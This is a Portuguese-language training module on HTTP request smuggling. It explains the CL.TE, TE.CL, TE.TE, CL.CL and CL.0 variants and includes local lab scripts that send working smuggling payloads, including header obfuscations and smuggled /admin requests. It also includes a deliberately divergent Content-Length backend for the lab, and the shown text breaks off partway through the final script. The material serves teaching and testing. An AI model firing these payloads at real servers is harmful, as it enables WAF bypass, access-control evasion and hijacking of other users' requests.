# Módulo 3 — TE / CL: as Combinações

**Carga:** 4 horas (1h30 teoria · 2h30 lab)
**Pré-requisitos:** Módulos 1 e 2 · Parser Differentials (módulo 6)

---

## ⚠ Este é o núcleo do curso

⚠ **A afirmação que organiza tudo:**

> **Dois headers dizem onde a mensagem termina. A spec diz qual vence. E as implementações discordam
> sobre quem vence — ou sobre o que cada header SIGNIFICA.**

⚠ **E é por isso que o tema é de 2005 e continua rendendo em 2026:** **a spec resolveu, e as
implementações em produção são de antes.**

⚠ **A tese:**

> **TE/CL não é UMA variante. É uma família** — **e cada membro é uma forma diferente de discordar
> sobre o mesmo par de headers.**

⚠ **E o mapa da família, que é o módulo inteiro:**

| # | Variante | Onde a discordância está |
|---|---|---|
| 1 | **CL.TE** | O frontend usa CL, o backend TE |
| 2 | **TE.CL** | O frontend usa TE, o backend CL |
| 3 | **TE.TE** | ⚠ Os dois usam TE, e **um não reconhece** |
| 4 | **CL.CL** | Dois `Content-Length`, valores diferentes |
| 5 | **CL.0** | ⚠ O backend **ignora** o CL |

⚠ **A variante 5 é a mais subestimada e a mais elegante.** **Ela não usa dois headers — usa um, e o
backend o ignora.** **É o caso do backend que trata qualquer coisa como GET.**

---

## 3.1 A origem: a spec e a precedência

⚠ **O que a spec diz, e quando ela passou a dizer.**

| Versão | O que diz | ⚠ Consequência |
|---|---|---|
| **RFC 2616** (1999) | Ambíguo sobre a precedência | ⚠ Silêncio inicial |
| **RFC 7230** (2014) | ⚠ `TE` vence; rejeitar se ambíguo | A correção |
| ⚠ **RFC 9112** (2022) | ⚠ **Rejeitar** a mensagem | A regra atual |

⚠ **E o ponto do curso:** **as implementações em produção não seguem todas a mesma versão.** **Um
proxy escrito em 2012 segue a 2616; um backend atualizado segue a 9112.** **E é entre eles que o
smuggling vive.**

⚠ **O que a RFC 9112 §6.3 diz, em essência:**

```
se a mensagem tem Transfer-Encoding E Content-Length:
   ⚠ isso é um ERRO.
   → o receptor DEVE tratar como erro e fechar a conexão.
   → ⚠ ou, se não puder, remover o Content-Length e usar o TE.
```

⚠ **A segunda opção é a da tolerância** — **e é a que cria o smuggling.** **Um proxy que "remove o
CL e usa o TE" pode repassar o CL ao backend** — **e aí o backend usa um header que o proxy já
descartou.**

⚠ **A tabela da tolerância, por comportamento:**

| Comportamento | Efeito |
|---|---|
| ⚠ **Rejeitar** | ✓ Imune |
| Remover o CL e usar TE | ⚠ Pode repassar o CL |
| Usar o CL | ⚠ **CL.TE** |
| Usar o TE | ⚠ **TE.CL** |
| Usar o primeiro que aparece | ⚠ Imprevisível |

⚠ **A regra escrita:**

> **A spec de hoje diz "rejeite".** **E toda implementação que não rejeita escolheu um dos dois
> headers** — **e a escolha é o que diverge.**

```bash
mkdir -p ~/smuggle-lab/mod03 && cd ~/smuggle-lab/mod03

echo "═══ 1. a origem: a spec ═══"
echo
cat > spec.md <<'EOF'
# A spec e a precedência

| Versão | O que diz | Consequência |
|---|---|---|
| RFC 2616 (1999) | ambíguo | ⚠ silêncio inicial |
| RFC 7230 (2014) | TE vence; rejeitar se ambíguo | a correção |
| ⚠ RFC 9112 (2022) | ⚠ REJEITAR a mensagem | a regra atual |

## O que a 9112 §6.3 diz
se a mensagem tem TE E CL:
   ⚠ é um ERRO.
   → o receptor DEVE tratar como erro e fechar a conexão.
   → OU, se não puder, remover o CL e usar o TE.

⚠ a SEGUNDA opção é a da tolerância —
   e é a que cria o smuggling.

## Por comportamento
| Comportamento | Efeito |
|---|---|
| ⚠ REJEITAR | ✓ IMUNE |
| remover o CL e usar TE | ⚠ pode repassar o CL |
| usar o CL | ⚠ CL.TE |
| usar o TE | ⚠ TE.CL |
| usar o primeiro que aparece | ⚠ imprevisível |

## ⚠ A REGRA
a spec de hoje diz REJEITE.
quem não rejeita ESCOLHEU um dos dois headers —
e a escolha é o que diverge.
EOF

cat spec.md

echo
echo "═══ 2. as cinco variantes ═══"
echo
cat <<'EXPL'
  ── 1. CL.TE ──
     O FRONTEND usa o Content-Length. O BACKEND usa o Transfer-Encoding.
     · o atacante manda os dois, com o CL menor que o real
     · o frontend consome CL bytes e repassa
     · ⚠ o backend lê o TE até o chunk 0 → e o resto vira a próxima
     ✓ é a variante "clássica" da literatura.

  ── 2. TE.CL ──
     O FRONTEND usa o TE. O BACKEND usa o CL.
     · ⚠ inverso da primeira
     · o frontend consome até o chunk 0
     · o backend usa o CL → e o que sobra vira a próxima

  ── 3. TE.TE ──
     OS DOIS usam o TE — e ⚠ um NÃO RECONHECE o header.
     · o atacante manda DOIS Transfer-Encoding, um ofuscado
     · ⚠ "Transfer-Encoding: chunked" e "Transfer-Encoding : xchunked"
     · um dos dois ignora o seu → e aí a discordância aparece
     ✓ é a variante mais sutil. módulo 4.

  ── 4. CL.CL ──
     DOIS Content-Length, com valores diferentes.
     · ⚠ e a spec diz REJEITAR — mas nem todos rejeitam
     · um usa o primeiro, o outro o último

  ── 5. CL.0 ──
     ⚠ UM header, e o BACKEND o IGNORA.
     · o frontend lê o CL, o backend trata como se não houvesse corpo
     · o corpo declarado se torna ⚠ a PRÓXIMA requisição
     ✓ é a variante do "backend que só faz GET".
EXPL
```

⚠ **As cinco variantes organizam o módulo.** **E note que as três primeiras usam **dois** headers, e
a quinta usa **um** — porque o problema não é o header, é o **desacordo**.

⚠ **E a variante CL.0 é a mais elegante, e a mais moderna.** **Não é um header malformado; é um
endpoint que não lê corpo.** **E o corpo declarado se torna o próximo pedido.**

**Produza `spec.md`:**

| Versão da RFC | O que diz |
|---|---|
| 7230 | |
| 9112 | |

**Responda:**

1. **Por que o tema é de 2005 e continua rendendo?**
2. **O que a 9112 recomenda?** Por que "remover o CL" é tolerância?
3. **Cite as cinco variantes.**
4. **Qual usa apenas um header?** Por quê?

---

## 3.2 CL.TE e TE.CL

⚠ **As duas variantes opostas. E o mecanismo de cada uma.**

⚠ **CL.TE — o frontend usa CL, o backend TE:**

```
┌──────────────────────────────────────────────────────────────────────┐
│ O PAYLOAD                                                            │
│                                                                      │
│   POST / HTTP/1.1\r\n                                                │
│   Content-Length: 6\r\n               ← ⚠ MENTE                       │
│   Transfer-Encoding: chunked\r\n                                     │
│   \r\n                                                               │
│   0\r\n                                                              │
│   \r\n                                                               │
│   GET /admin HTTP/1.1\r\n                                            │
│                                                                      │
├──────────────────────────────────────────────────────────────────────┤
│ FRONTEND (CL): consome 6 bytes → "0\r\n\r\n"                          │
│   → repassa cabeçalho + 6 bytes                                       │
│   ⚠ e descarta o resto? NÃO — ele já repassou.                        │
│   ⚠ o resto FICA no socket para ser repassado quando chegar           │
├──────────────────────────────────────────────────────────────────────┤
│ BACKEND (TE): lê o chunk 0 → termina a 1ª requisição                  │
│   ⚠ e o GET /admin está no socket → ⚠ é a 2ª requisição               │
└──────────────────────────────────────────────────────────────────────┘
```

⚠ **O ponto que quase todos erram:** **o frontend não "descarta" o resto.** **Ele consumiu 6 bytes
e repassou; o que sobra no stream é repassado quando o atacante mandar mais** — **ou quando a
próxima requisição de outra pessoa chegar.**

⚠ **TE.CL — a inversa, e o mecanismo muda:**

| | CL.TE | TE.CL |
|---|---|---|
| Frontend usa | CL | ⚠ TE |
| Backend usa | TE | ⚠ CL |
| O atacante mente | ⚠ **no CL** | ⚠ **no chunk** |
| O que sobra | O pedido escondido | O pedido escondido |
| ⚠ Encaminhamento | o frontend repassa **tudo** | ⚠ **o frontend só repassa parte** |

⚠ **A última linha é a diferença prática.** **Em TE.CL, o frontend consome só até o chunk 0 e
repassa **menos** que o atacante mandou** — **e o backend espera mais.** **É o mesmo desync, com o
encaminhamento invertido.**

⚠ **A tabela do que testar, por variante:**

| Variante | O que o atacante mente |
|---|---|
| **CL.TE** | O `Content-Length` é **menor** que o corpo real |
| **TE.CL** | O **chunk** está certo, e o `CL` mente |
| **CL.CL** | O segundo `CL` mente |
| **CL.0** | Nada — o backend simplesmente não lê |

⚠ **A regra escrita:**

> **Você não "injeta" o pedido escondido.** **Ele já está lá** — **e o que você escolhe é qual dos
> dois parsers vai contá-lo como parte da primeira mensagem.**

```bash
cd ~/smuggle-lab/mod03

echo "═══ 3. CL.TE e TE.CL ═══"
echo
cat > variantes.md <<'EOF'
# CL.TE e TE.CL

## CL.TE
| Item | Valor |
|---|---|
| frontend usa | ⚠ CONTENT-LENGTH |
| backend usa | ⚠ TRANSFER-ENCODING |
| o atacante mente | no CL (menor que o real) |
| ⚠ o que sobra | fica no socket e é repassado depois |

## TE.CL
| Item | Valor |
|---|---|
| frontend usa | ⚠ TRANSFER-ENCODING |
| backend usa | ⚠ CONTENT-LENGTH |
| o atacante mente | no CL (o chunk está certo) |
| ⚠ o encaminhamento | o frontend repassa MENOS que o atacante mandou |

## ⚠ a diferença prática
CL.TE: o frontend repassa TUDO (ele consumiu menos e o resto fica no stream)
TE.CL: o frontend repassa MENOS → o backend ESPERA MAIS
✓ é o mesmo desync, com o encaminhamento invertido.

## O que o atacante mente, por variante
| Variante | Ele mente |
|---|---|
| CL.TE | o Content-Length é MENOR |
| TE.CL | o chunk está certo, o CL mente |
| CL.CL | o segundo CL mente |
| CL.0 | ⚠ nada — o backend não lê |

## ⚠ A REGRA
o pedido escondido JÁ ESTÁ no payload.
✓ você escolhe QUAL parser o contará como parte da 1ª mensagem.
EOF

cat variantes.md

echo
echo "═══ 4. um medidor das duas variantes ═══"
echo
cat > mede-tecl.py <<'PY'
#!/usr/bin/env python3
"""
mede-tecl.py — manda CL.TE e TE.CL e conta o que o backend viu.

⚠ DIDÁTICO e LOCAL (127.0.0.1). o backend é SEU.
"""
import socket, sys, os, time

HOST = "127.0.0.1"
PORT = int(sys.argv[1]) if len(sys.argv) > 1 else 8081
LOG = os.path.expanduser("~/smuggle-lab/evidencia/backend.log")

# ─── CL.TE: o CL mente (6), o TE é o real ───
CL_TE = (
    b"POST / HTTP/1.1\r\n"
    b"Host: localhost\r\n"
    b"Content-Length: 6\r\n"
    b"Transfer-Encoding: chunked\r\n"
    b"\r\n"
    b"0\r\n"
    b"\r\n"
    b"GET /admin-clte HTTP/1.1\r\n"
    b"Host: localhost\r\n"
    b"\r\n"
)

# ─── TE.CL: o chunk está certo, o CL mente ───
TE_CL = (
    b"POST / HTTP/1.1\r\n"
    b"Host: localhost\r\n"
    b"Content-Length: 4\r\n"
    b"Transfer-Encoding: chunked\r\n"
    b"\r\n"
    b"5c\r\n"
    b"GET /admin-tecl HTTP/1.1\r\nHost: localhost\r\n\r\n" + b"x" * 40 + b"\r\n"
    b"0\r\n"
    b"\r\n"
)


def conta():
    try:
        with open(LOG) as f:
            t = f.read()
        return t.count("═══ requisição #"), t
    except FileNotFoundError:
        return 0, ""


def manda(payload: bytes, nome: str):
    antes, _ = conta()
    try:
        with socket.create_connection((HOST, PORT), timeout=6) as s:
            s.sendall(payload)
            s.settimeout(3)
            try:
                while True:
                    d = s.recv(4096)
                    if not d: break
            except socket.timeout:
                pass
    except Exception as e:
        print(f"    ⚠ {type(e).__name__}")
        return 0
    time.sleep(0.4)
    depois, _ = conta()
    return depois - antes


def main():
    print("═══ MEDINDO CL.TE E TE.CL ═══")
    print()
    print(f"  alvo: {HOST}:{PORT}   ⚠ LOCAL")
    print()

    for nome, payload, marca in [
        ("CL.TE", CL_TE, "admin-clte"),
        ("TE.CL", TE_CL, "admin-tecl"),
    ]:
        print(f"  ── {nome} ──")
        print(f"     payload: {len(payload)} bytes")
        n = manda(payload, nome)
        _, log = conta()
        print(f"     ⚠ o backend viu: {n} nova(s) requisição(ões)")
        if marca in log:
            print(f"     ⚠⚠ '{marca}' APARECEU no log — é o desync")
        else:
            print(f"     · '{marca}' não apareceu")
        print()

    print("  ═══ COMO LER ═══")
    print("  · 1 requisição  → não houve desync (o backend usou a mesma regra)")
    print("  · 2+ requisições → ⚠ houve desync")
    print("  ⚠ e a string no log é a PROVA: não é interpretação.")
    print()
    print("  ⚠ tudo local. nenhum serviço de terceiro.")


if __name__ == "__main__":
    main()
PY

chmod +x mede-tecl.py
echo "  ── o medidor pronto ──"
echo "     python3 ~/smuggle-lab/mod03/mede-tecl.py 8081"
```

⚠ **O medidor é o instrumento, e ele mede as duas variantes de uma vez.** **E a string no log é a
prova** — **porque é literal: o que o atacante escreveu apareceu onde não devia.**

⚠ **E o comentário sobre o frontend "não descartar" é o que a maioria erra.** **O byte que sobra
fica no **socket** — **e é repassado quando houver mais dados.**

**Produza `variantes.md`:**

| Variante | Frontend usa | Backend usa |
|---|---|---|
| CL.TE | | |
| TE.CL | | |

**Responda:**

1. **Em CL.TE, quem mente?** Em TE.CL?
2. **Qual a diferença prática de encaminhamento?**
3. **Por que o frontend não "descarta" o resto?**
4. **Quantas requisições apareceram** no log?

---

## 3.3 TE.TE e CL.CL

⚠ **As duas variantes de header duplicado. E o mecanismo é diferente: a discordância está no
**reconhecimento** do header.**

⚠ **TE.TE — os dois usam TE, e um não reconhece:**

```
┌──────────────────────────────────────────────────────────────────────┐
│ O PAYLOAD                                                            │
│                                                                      │
│   POST / HTTP/1.1\r\n                                                │
│   Transfer-Encoding: chunked\r\n                                     │
│   Transfer-Encoding: xchunked\r\n     ← ⚠ ofuscado                    │
│   \r\n                                                               │
│   0\r\n                                                              │
│   \r\n                                                               │
│   GET /admin HTTP/1.1\r\n                                            │
│                                                                      │
├──────────────────────────────────────────────────────────────────────┤
│ FRONTEND: reconhece "chunked" → usa o TE → lê até o chunk 0            │
│ BACKEND:  ⚠ NÃO reconhece "xchunked" → ignora o TE → usa o CL (0)      │
│                                                                      │
│   ⚠ o backend acha que NÃO HÁ CORPO                                   │
│   ⚠ e o "0\r\n\r\nGET /admin..." se torna a PRÓXIMA requisição        │
└──────────────────────────────────────────────────────────────────────┘
```

⚠ **A ofuscação é o núcleo do TE.TE.** **Não é "dois TE válidos"** — **é um que o **frontend**
reconhece e o backend **não**. **E as ofuscações são muitas:**

| Ofuscação | O que um parser aceita |
|---|---|
| `xchunked` | ⚠ Ignorado por muitos |
| `chunked ` (espaço) | Depende |
| `CHUNKED` | Case |
| `chunked\r\n` | Espaço no fim |
| `chunked, chunked` | Lista |
| `Transfer-Encoding : chunked` | ⚠ **Espaço antes dos dois pontos** |

⚠ **A linha do espaço antes dos dois pontos é a mais clássica e a mais elegante.** **`Transfer-Encoding :
chunked`** — **com espaço antes do `:`** — **é **inválido** pela spec** — **e muitos parsers aceitam,
outros não.** **É a mesma divergência, num só header.**

⚠ **CL.CL — dois Content-Length:**

| Comportamento | Efeito |
|---|---|
| **Rejeitar** | ✓ Imune |
| Usar o **primeiro** | ⚠ Um lado |
| Usar o **último** | ⚠ Outro lado |
| ⚠ Somar | ⚠ Outro ainda |

⚠ **A linha da soma parece absurda e existe.** **Uma implementação que soma os dois `CL`** — **e a
outra que usa o primeiro** — **discordam sobre o tamanho.** **É a variante mais imprevisível.**

⚠ **A regra escrita:**

> **A discordância não precisa de dois headers diferentes.** **Basta que os dois parsers não
> concordem sobre qual header é válido.**

```bash
cd ~/smuggle-lab/mod03

echo "═══ 5. TE.TE e CL.CL ═══"
echo
cat > te-te.md <<'EOF'
# TE.TE e CL.CL

## TE.TE
| Item | Valor |
|---|---|
| os dois usam | TE |
| ⚠ a discordância | um NÃO RECONHECE o header |
| o atacante manda | dois TE, um ofuscado |
| efeito | o que ignora o TE acha que NÃO HÁ CORPO |

## As ofuscações
| Ofuscação | O que um parser aceita |
|---|---|
| `xchunked` | ignorado por muitos |
| `chunked ` (espaço no fim) | depende |
| `CHUNKED` | case |
| `chunked, chunked` | lista |
| ⚠ `Transfer-Encoding : chunked` | ⚠ ESPAÇO antes dos dois pontos |

## ⚠ a mais elegante
o espaço antes do ":" é INVÁLIDO pela spec —
e muitos parsers aceitam, outros não.
✓ a mesma divergência, num SÓ header.

## CL.CL — dois Content-Length
| Comportamento | Efeito |
|---|---|
| REJEITAR | ✓ imune |
| usar o PRIMEIRO | um lado |
| usar o ÚLTIMO | outro lado |
| ⚠ SOMAR | outro ainda |

## ⚠ A REGRA
a discordância não precisa de dois headers DIFERENTES.
basta que os dois parsers não concordem sobre qual header é VÁLIDO.
EOF

cat te-te.md

echo
echo "═══ 6. o medidor das duplicatas ═══"
echo
cat > mede-duplicatas.py <<'PY'
#!/usr/bin/env python3
"""
mede-duplicatas.py — manda TE.TE e CL.CL e conta o que o backend viu.

⚠ DIDÁTICO e LOCAL (127.0.0.1).
"""
import socket, sys, os, time

HOST = "127.0.0.1"
PORT = int(sys.argv[1]) if len(sys.argv) > 1 else 8081
LOG = os.path.expanduser("~/smuggle-lab/evidencia/backend.log")

CASOS = [
    ("TE.TE (xchunked)", (
        b"POST / HTTP/1.1\r\nHost: localhost\r\n"
        b"Transfer-Encoding: chunked\r\n"
        b"Transfer-Encoding: xchunked\r\n\r\n"
        b"0\r\n\r\nGET /admin-tete HTTP/1.1\r\nHost: localhost\r\n\r\n"
    ), "admin-tete"),

    ("TE.TE (espaco antes dos :)", (
        b"POST / HTTP/1.1\r\nHost: localhost\r\n"
        b"Transfer-Encoding: chunked\r\n"
        b"Transfer-Encoding : chunked\r\n\r\n"
        b"0\r\n\r\nGET /admin-space HTTP/1.1\r\nHost: localhost\r\n\r\n"
    ), "admin-space"),

    ("CL.CL (6 e 10)", (
        b"POST / HTTP/1.1\r\nHost: localhost\r\n"
        b"Content-Length: 6\r\nContent-Length: 10\r\n\r\n"
        b"AAAAAAGET /admin-clcl HTTP/1.1\r\nHost: localhost\r\n\r\n"
    ), "admin-clcl"),
]


def conta():
    try:
        with open(LOG) as f:
            t = f.read()
        return t.count("═══ requisição #"), t
    except FileNotFoundError:
        return 0, ""


def manda(payload: bytes) -> int:
    antes, _ = conta()
    try:
        with socket.create_connection((HOST, PORT), timeout=6) as s:
            s.sendall(payload)
            s.settimeout(3)
            try:
                while True:
                    d = s.recv(4096)
                    if not d: break
            except socket.timeout:
                pass
    except Exception:
        return 0
    time.sleep(0.4)
    depois, _ = conta()
    return depois - antes


def main():
    print("═══ DUPLICATAS E OFUSCAÇÕES ═══")
    print()
    print(f"  alvo: {HOST}:{PORT}   ⚠ LOCAL")
    print()
    for nome, payload, marca in CASOS:
        print(f"  ── {nome} ──")
        n = manda(payload)
        _, log = conta()
        print(f"     ⚠ o backend viu: {n} nova(s)")
        if marca in log:
            print(f"     ⚠⚠ '{marca}' APARECEU — é o desync")
        else:
            print(f"     · '{marca}' não apareceu")
        print()
    print("  ⚠ tudo local. nenhum serviço de terceiro.")


if __name__ == "__main__":
    main()
PY

chmod +x mede-duplicatas.py
echo "  ── pronto ──"
echo "     python3 ~/smuggle-lab/mod03/mede-duplicatas.py 8081"
```

⚠ **O medidor cobre três casos de uma vez.** **E a ofuscação do espaço é a mais reveladora** —
**porque ambos os `TE` são válidos em conteúdo, e só a **forma** difere.**

⚠ **E a nota do `CL.CL` com a soma é o alerta:** **existe comportamento ainda mais imprevisível que
primeiro/último** — **e é por isso que a spec mudou para **rejeitar**.**

**Produza `te-te.md`:**

| Variante | Discordância em |
|---|---|
| TE.TE | |
| CL.CL | |

**Responda:**

1. **Por que TE.TE não é "dois TE válidos"?
2. **Qual a ofuscação mais elegante?** Por quê?
3. **Cite quatro comportamentos possíveis do CL.CL.**
4. **Qual apareceu no log** no seu lab?

---

## 3.4 CL.0 e o caso moderno

⚠ **A variante de um header só. E a mais relevante em 2025–26.**

⚠ **O mecanismo: **o frontend lê o `Content-Length`; o backend **ignora** o corpo.**

| Onde aparece | Por que o backend ignora |
|---|---|
| Endpoint que só faz GET | ⚠ Não há corpo a ler |
| Backend estático | Não processa POST |
| ⚠ **Handler antes do corpo** | Redireciona sem ler |
| Erro de configuração | O corpo nunca é lido |

⚠ **A linha do "handler antes do corpo" é a mais moderna.** **Muitos frameworks respondem antes de
ler o corpo** — **um redirect, um 401, um 403.** **E o corpo **fica no socket**** — **e vira a
próxima requisição.**

⚠ **A tabela do que isso habilita:**

| Cenário | Efeito |
|---|---|
| Redirect antes do corpo | ⚠ O corpo vira o próximo pedido |
| 401 antes do corpo | ⚠ Idem |
| ⚠ **Requisição passando pelo filtro** | ⚠ **Desync entre WAF e backend** |

⚠ **A terceira linha é o caso de maior rendimento.** **O WAF lê o `CL` e valida o corpo como
"inofensivo"; o backend ignora o corpo** — **e o corpo se torna a próxima requisição, sem passar
pelo WAF.**

⚠ **E é por isso que `CL.0` é a variante moderna:** **ela não depende de ambiguidade de header** —
**depende do fluxo de controle do backend.** **E é muito comum.**

⚠ **A regra escrita:**

> **O `CL.0` não é um erro de parsing. É um endpoint que responde antes de ler.** **E o corpo que
> ninguém leu é o próximo pedido.**

```bash
cd ~/smuggle-lab/mod03

echo "═══ 7. CL.0 ═══"
echo
cat > cl-zero.md <<'EOF'
# CL.0 — a variante moderna

## O mecanismo
o FRONTEND lê o Content-Length.
o BACKEND ⚠ IGNORA o corpo.

## Onde o backend ignora
| Onde | Por quê |
|---|---|
| endpoint que só faz GET | não há corpo a ler |
| backend estático | não processa POST |
| ⚠ handler ANTES do corpo | redireciona sem ler |
| erro de configuração | o corpo nunca é lido |

## O que isso habilita
| Cenário | Efeito |
|---|---|
| redirect antes do corpo | o corpo vira o próximo pedido |
| 401 antes do corpo | idem |
| ⚠ requisição passando pelo filtro | ⚠ DESYNC entre WAF e backend |

## ⚠ o caso de maior rendimento
o WAF lê o CL e valida o corpo como "inofensivo".
o BACKEND ignora o corpo.
⚠ e o corpo se torna a próxima requisição — SEM passar pelo WAF.

## ⚠ por que é a variante MODERNA
não depende de ambiguidade de header.
depende do FLUXO DE CONTROLE do backend.
✓ e é muito comum.

## ⚠ A REGRA
o CL.0 não é erro de parsing.
é um endpoint que responde ANTES de ler.
e o corpo que ninguém leu é o PRÓXIMO pedido.
EOF

cat cl-zero.md

echo
echo "═══ 8. o mapa completo das cinco ═══"
echo
cat <<'EXPL'
  ┌──────────┬──────────────────────────┬─────────────────────────────┐
  │ VARIANTE │ ONDE ESTÁ A DISCORDÂNCIA │ O QUE O ATACANTE EXPLORA    │
  ├──────────┼──────────────────────────┼─────────────────────────────┤
  │ CL.TE    │ o frontend usa CL        │ o CL mente (menor)          │
  │ TE.CL    │ o frontend usa TE        │ o CL mente, o chunk não     │
  │ TE.TE    │ ⚠ um não RECONHECE o TE  │ a ofuscação do header       │
  │ CL.CL    │ dois CL, valores opostos │ ⚠ rejeição vs. escolha       │
  │ ⚠ CL.0   │ o backend IGNORA o corpo │ ⚠ o fluxo de controle       │
  └──────────┴──────────────────────────┴─────────────────────────────┘

  ✓ cinco variantes, e cada uma é uma forma de discordar sobre o LIMITE.
     ⚠ e todas dependem das três condições do módulo 2.
EXPL
```

⚠ **O mapa fecha o módulo.** **E note que a coluna do meio é sempre "onde está a discordância"** —
**que é o critério do curso inteiro.**

⚠ **E a nota final é a ligação com o módulo 2:** **nenhuma variante funciona sem as três condições.**
**Ela é a variante; as condições são a existência.**

**Produza `cl-zero.md`:**

| Onde o backend ignora | Por quê |
|---|---|
| | |
| Handler antes do corpo | |

**Responda:**

1. **Qual o mecanismo do CL.0?** Por que é de um header só?
2. **Cite três lugares onde o backend ignora o corpo.**
3. **Por que o WAF + backend é o caso de maior rendimento?**
4. **Por que o CL.0 é a variante moderna?**

---

## 3.5 LAB — As cinco variantes

**Duração:** 150 min

### Passo 1 — Monte o cenário das duas regras (45 min)

⚠ **Você precisa de um frontend que use CL e um backend que use TE — e vice-versa.**

```bash
cd ~/smuggle-lab

echo "═══ MONTANDO O CENÁRIO ═══"
echo
cat <<'EXPL'
  ── O QUE VOCÊ PRECISA ──

     1. um FRONTEND com uma regra conhecida
     2. um BACKEND com a regra OPOSTA
     3. ⚠ e o log do backend

  ── OPÇÃO A: as duas camadas didáticas ──
     · proxy_te.py (módulo 1) → regra do TE
     · ⚠ e um backend que use CL

  ── OPÇÃO B: usar os produtos reais ──
     · nginx como frontend
     · o backend_log.py como backend
     ✓ e descobrir a regra do nginx MEDINDO (módulo 2)

     ⚠ a opção B é mais realista — e mais rápida de montar.
EXPL

# um backend com a regra do CL (o oposto do proxy_te)
cat > backends/backend_cl.py <<'PY'
#!/usr/bin/env python3
"""
backend_cl.py — backend que usa a regra do CONTENT-LENGTH.

⚠ o par divergente com o proxy_te (que usa TE).
   LOCAL (127.0.0.1).
"""
import socket, sys, threading, os

HOST, PORT = "127.0.0.1", int(sys.argv[1]) if len(sys.argv) > 1 else 8090
LOG = os.path.expanduser("~/smuggle-lab/evidencia/backend-cl.log")

_c, _lock = 0, threading.Lock()


def atende(cli):
    global _c
    try:
        while True:
            dados = b""
            while b"\r\n\r\n" not in dados:
                b = cli.recv(1)
                if not b: return
                dados += b
            fim = dados.index(b"\r\n\r\n") + 4
            cab = dados[:fim]

            # ⚠ A REGRA: o Content-Length vence
            cl = 0
            for l in cab.decode(errors="replace").split("\r\n"):
                if l.lower().startswith("content-length:"):
                    try: cl = int(l.split(":", 1)[1].strip())
                    except ValueError: cl = 0

            corpo = dados[fim:]
            while len(corpo) < cl:
                b = cli.recv(cl - len(corpo))
                if not b: break
                corpo += b

            with _lock:
                _c += 1
                n = _c
            primeira = cab.decode(errors="replace").split("\r\n")[0]
            path = primeira.split(" ")[1] if len(primeira.split(" ")) > 1 else "/"

            with open(LOG, "a") as f:
                f.write(f"\n═══ requisição #{n} ═══\n")
                f.write(f"PRIMEIRA_LINHA: {primeira}\nPATH: {path}\n")
                f.write(f"CL: {cl}  CORPO({len(corpo)}B): {corpo[:80]!r}\n")

            print(f"  [backend-CL #{n}] {primeira[:50]}  path={path[:30]}", flush=True)

            r = f"OK #{n} {path}".encode()
            cli.sendall(b"HTTP/1.1 200 OK\r\nContent-Length: "
                        + str(len(r)).encode() + b"\r\nConnection: keep-alive\r\n\r\n" + r)
    except Exception:
        pass
    finally:
        try: cli.close()
        except Exception: pass


def main():
    os.makedirs(os.path.dirname(LOG), exist_ok=True)
    open(LOG, "w").close()
    s = socket.socket(); s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind((HOST, PORT)); s.listen(5)
    print(f"═══ BACKEND (regra CL) em {HOST}:{PORT} ═══")
    print(f"  log: {LOG}")
    print("  ⚠ local, didático.")
    print()
    while True:
        cli, _ = s.accept()
        threading.Thread(target=atende, args=(cli,), daemon=True).start()


if __name__ == "__main__":
    main()
PY

chmod +x backends/backend_cl.py

echo "  ── o backend divergente está pronto ──"
echo
echo "  ── O PAR DIVERGENTE ──"
cat <<'EXPL'
     frontend (TE)  :8081  →  backend (CL) :8090
        ⚠ TE.CL — o frontend usa TE, o backend usa CL

     ⚠ RODE ASSIM:
        # terminal 1
        python3 ~/smuggle-lab/backends/backend_cl.py 8090
        # terminal 2
        python3 ~/smuggle-lab/frontends/proxy_te.py 8081 8090
        # terminal 3 — o log
        tail -f ~/smuggle-lab/evidencia/backend-cl.log
EXPL
```

⚠ **O par divergente está montado, e a variante é TE.CL.** **E a nota de rodar é deliberada:** **o
log é o instrumento, e você o acompanha em tempo real.**

⚠ **E a alternativa com nginx é a mais realista.** **Ela exige **medir** a regra do produto** —
**que é o exercício do módulo 2.**

**Produza `cenario.md`:**

| Camada | Regra | Porta |
|---|---|---|
| Frontend | | |
| Backend | | |

**Responda:**

1. **Qual variante você montou?** Por quê?
2. **A regra do frontend é a do TE?** E a do backend?
3. **O log é o instrumento?** Onde está?
4. **As duas são locais?** Confirme.

### Passo 2 — Rode as cinco variantes (65 min)

⚠ **As cinco, na mesma cadeia. E a contagem em cada uma.**

```bash
cd ~/smuggle-lab/mod03

echo "═══ AS CINCO VARIANTES ═══"
echo
cat > mede-cinco.py <<'PY'
#!/usr/bin/env python3
"""
mede-cinco.py — roda as CINCO variantes e conta o que o backend viu.

⚠ DIDÁTICO e LOCAL (127.0.0.1).
"""
import socket, sys, os, time

HOST = "127.0.0.1"
PORT = int(sys.argv[1]) if len(sys.argv) > 1 else 8081
LOG = sys.argv[2] if len(sys.argv) > 2 else os.path.expanduser(
    "~/smuggle-lab/evidencia/backend-cl.log")

CASOS = [
    ("1. CL.TE", b"POST / HTTP/1.1\r\nHost: l\r\nContent-Length: 6\r\n"
                 b"Transfer-Encoding: chunked\r\n\r\n0\r\n\r\n"
                 b"GET /v1-clte HTTP/1.1\r\nHost: l\r\n\r\n", "v1-clte"),
    ("2. TE.CL", b"POST / HTTP/1.1\r\nHost: l\r\nContent-Length: 4\r\n"
                 b"Transfer-Encoding: chunked\r\n\r\n"
                 b"5c\r\nGET /v2-tecl HTTP/1.1\r\nHost: l\r\n\r\n" + b"x"*40 + b"\r\n0\r\n\r\n",
                 "v2-tecl"),
    ("3. TE.TE", b"POST / HTTP/1.1\r\nHost: l\r\n"
                 b"Transfer-Encoding: chunked\r\n"
                 b"Transfer-Encoding: xchunked\r\n\r\n0\r\n\r\n"
                 b"GET /v3-tete HTTP/1.1\r\nHost: l\r\n\r\n", "v3-tete"),
    ("4. CL.CL", b"POST / HTTP/1.1\r\nHost: l\r\nContent-Length: 6\r\n"
                 b"Content-Length: 10\r\n\r\nAAAAAAGET /v4-clcl HTTP/1.1\r\nHost: l\r\n\r\n",
                 "v4-clcl"),
    ("5. CL.0", b"GET /v5-cl0 HTTP/1.1\r\nHost: l\r\nContent-Length: 44\r\n\r\n"
                b"GET /v5-escondido HTTP/1.1\r\nHost: l\r\n\r\n", "v5-escondido"),
]


def conta():
    try:
        with open(LOG) as f:
            t = f.read()
        return t.count("═══ requisição #"), t
    except FileNotFoundError:
        return 0, ""


def manda(payload: bytes) -> int:
    antes, _ = conta()
    try:
        with socket.create_connection((HOST, PORT), timeout=6) as s:
            s.sendall(payload)
            s.settimeout(3)
            try:
                while True:
                    d = s.recv(4096)
                    if not d: break
            except socket.timeout:
                pass
    except Exception:
        return 0
    time.sleep(0.4)
    depois, _ = conta()
